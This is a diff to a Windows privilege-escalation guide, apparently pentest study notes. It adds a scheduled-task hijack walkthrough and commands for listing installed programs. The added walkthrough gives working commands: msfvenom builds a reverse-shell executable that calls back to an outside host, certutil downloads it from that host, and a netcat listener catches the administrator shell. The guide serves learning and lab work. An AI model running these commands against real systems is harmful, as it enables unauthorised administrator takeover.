@@ -1216,6 +1216,26 @@ One way to get hints can be by locating a script or log file that indicates a sc
     ```
 5. To finish the exploit, wait for the scheduled task to run (it should run every x amount of time).
 
+#### Scheduled Tasks Privilege Escalation Method #2
+
+1. I was able to delete `name.EXE` which means we can replace it with a malicious shell. Knowing this we can generate a reverse shell with `msfvenom` and call it `name.EXE`.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.230 LPORT=21 -f exe > name.EXE
+```
+
+2\. The shell was then uploaded with `certutil.exe`.
+
+```
+certutil.exe -f -urlcache -split http://192.168.49.230/TFTP.EXE
+```
+
+3\. A `netcat` listener was set up on port 21 and after 5 minutes the `TFTP.EXE` was executed as part of the scheduled task and we receive an administrator shell.
+
+```
+sudo nc -lvp 21
+```
+
 ## AlwaysInstallElevated
 
 ### Malicious MSI
@@ -1331,6 +1351,18 @@ oLink.Save
 The majority of privilege escalations involving installed apps are due to misconfigurations. Even so, some privilege escalation is caused through memory corruption exploits, therefore knowing how to identify installed applications and known vulnerabilities is still necessary.
 
 #### Install Applications Commands
+
+Enumerate installed applications/programs:
+
+```powershell
+ls -force "C:\Program Files (x86)\"
+ls -force "C:\Program Files"
+ls -force "C:\Program Files (x86)\" -recurse
+ls -force "C:\Program Files" -recurse
+
+# Directories only
+ls -force "C:\Program Files" -recurse -attributes directory
+```
 
 Manually enumerate all running programs:
 
